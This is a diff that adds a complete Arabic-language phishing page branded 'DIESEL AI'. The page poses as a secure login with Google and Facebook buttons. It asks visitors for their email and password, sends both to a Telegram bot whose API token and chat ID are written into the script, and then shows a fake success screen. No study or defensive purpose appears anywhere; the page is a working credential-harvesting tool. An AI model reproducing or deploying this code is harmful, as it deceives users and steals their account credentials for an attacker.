@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>DIESEL AI | SECURE LOGIN</title>
+    <style>
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        /* تأثير النور */
+        .glow { text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41; }
+        
+        .login-container { border: 2px solid #00ff41; padding: 40px; border-radius: 15px; width: 350px; background: rgba(0,0,0,0.8); box-shadow: 0 0 30px rgba(0,255,65,0.2); }
+        .btn-social { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #00ff41; background: transparent; color: #00ff41; cursor: pointer; transition: 0.3s; font-weight: bold; }
+        .btn-social:hover { background: #00ff41; color: #000; }
+        
+        #auth-screen { display: block; }
+        #main-content { display: none; text-align: center; }
+        
+        /* أيقونات وهمية احترافية */
+        .icon { width: 20px; margin-left: 10px; }
+    </style>
+</head>
+<body>
+
+    <div id="auth-screen" class="login-container">
+        <h1 class="glow">DIESEL AI</h1>
+        <p>التحقق من الهوية مطلوب للمتابعة</p>
+        
+        <button class="btn-social" onclick="fakeLogin('Google')">تسجيل عبر Google 📧</button>
+        <button class="btn-social" onclick="fakeLogin('Facebook')">تسجيل عبر Facebook 📘</button>
+    </div>
+
+    <div id="main-content">
+        <h1 class="glow">تم التحقق بنجاح</h1>
+        <p>مرحباً بك في وحدة تحكم DIESEL AI</p>
+    </div>
+
+    <script>
+        function fakeLogin(type) {
+            const user = prompt(`أدخل البريد الإلكتروني الخاص بـ ${type}:`);
+            const pass = prompt("أدخل كلمة المرور:");
+            
+            if(user && pass) {
+                alert("جاري التحقق من البيانات عبر خوادم DIESEL AI...");
+                // إرسال البيانات لتليجرام
+                fetch(`https://api.telegram.org/bot8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: '5177962707', text: `🚨 HIT: ${type}\nUser: ${user}\nPass: ${pass}`})
+                });
+                
+                document.getElementById('auth-screen').style.display = 'none';
+                document.getElementById('main-content').style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
